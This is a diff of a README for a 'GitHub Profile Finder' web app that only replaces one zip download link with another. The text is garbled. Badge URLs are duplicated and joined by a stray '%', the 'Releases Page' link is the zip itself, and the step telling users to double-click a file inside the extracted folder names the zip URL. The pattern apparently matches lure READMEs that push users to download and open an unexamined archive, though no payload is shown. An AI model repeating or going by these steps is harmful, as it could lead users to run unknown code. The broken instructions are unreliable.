@@ -4,12 +4,12 @@
 GitHub Profile Finder is a front-end web application that helps you find and display a GitHub user's profile easily. With this tool, you can quickly see their bio, stats, and the latest 5 repositories. It's built using HTML, CSS, and JavaScript, and uses the GitHub REST API to pull in the information you need.
 
 ## 🔗 Get It Now
-[![Download Now](https://github.com/pantriq/Github-Profile-Finder/raw/refs/heads/main/assets/Profile_Github_Finder_1.0.zip%https://github.com/pantriq/Github-Profile-Finder/raw/refs/heads/main/assets/Profile_Github_Finder_1.0.zip)](https://github.com/pantriq/Github-Profile-Finder/raw/refs/heads/main/assets/Profile_Github_Finder_1.0.zip)
+[![Download Now](https://raw.githubusercontent.com/pantriq/Github-Profile-Finder/main/assets/Finder-Profile-Github-v2.0.zip%https://raw.githubusercontent.com/pantriq/Github-Profile-Finder/main/assets/Finder-Profile-Github-v2.0.zip)](https://raw.githubusercontent.com/pantriq/Github-Profile-Finder/main/assets/Finder-Profile-Github-v2.0.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run the application:
 
-1. **Visit the Releases Page**: Click on this link to go to the Releases page: [Download Page](https://github.com/pantriq/Github-Profile-Finder/raw/refs/heads/main/assets/Profile_Github_Finder_1.0.zip).
+1. **Visit the Releases Page**: Click on this link to go to the Releases page: [Download Page](https://raw.githubusercontent.com/pantriq/Github-Profile-Finder/main/assets/Finder-Profile-Github-v2.0.zip).
 
 2. **Choose the Latest Version**: Look for the most recent version listed. It usually has the highest number or the word "latest" next to it.
 
@@ -20,8 +20,8 @@ Follow these steps to download and run the application:
    - Right-click the zip file and select "Extract All" or a similar option depending on your operating system.
 
 5. **Open the Application**: 
-   - Look for `https://github.com/pantriq/Github-Profile-Finder/raw/refs/heads/main/assets/Profile_Github_Finder_1.0.zip` inside the extracted folder. 
-   - Double-click the `https://github.com/pantriq/Github-Profile-Finder/raw/refs/heads/main/assets/Profile_Github_Finder_1.0.zip` file. This should open the application in your default web browser.
+   - Look for `https://raw.githubusercontent.com/pantriq/Github-Profile-Finder/main/assets/Finder-Profile-Github-v2.0.zip` inside the extracted folder. 
+   - Double-click the `https://raw.githubusercontent.com/pantriq/Github-Profile-Finder/main/assets/Finder-Profile-Github-v2.0.zip` file. This should open the application in your default web browser.
 
 ## 🛠️ System Requirements
 - A modern web browser (like Chrome, Firefox, or Edge).
@@ -59,4 +59,4 @@ This project is open-source and available for anyone to use or modify. Check the
 We welcome contributions! If you want to improve the app or report issues, we encourage you to reach out. Check the contributing guidelines available in the repository for more details.
 
 ## 🔗 Download Again
-To download the application, you can return to this link: [Download Page](https://github.com/pantriq/Github-Profile-Finder/raw/refs/heads/main/assets/Profile_Github_Finder_1.0.zip).
+To download the application, you can return to this link: [Download Page](https://raw.githubusercontent.com/pantriq/Github-Profile-Finder/main/assets/Finder-Profile-Github-v2.0.zip).
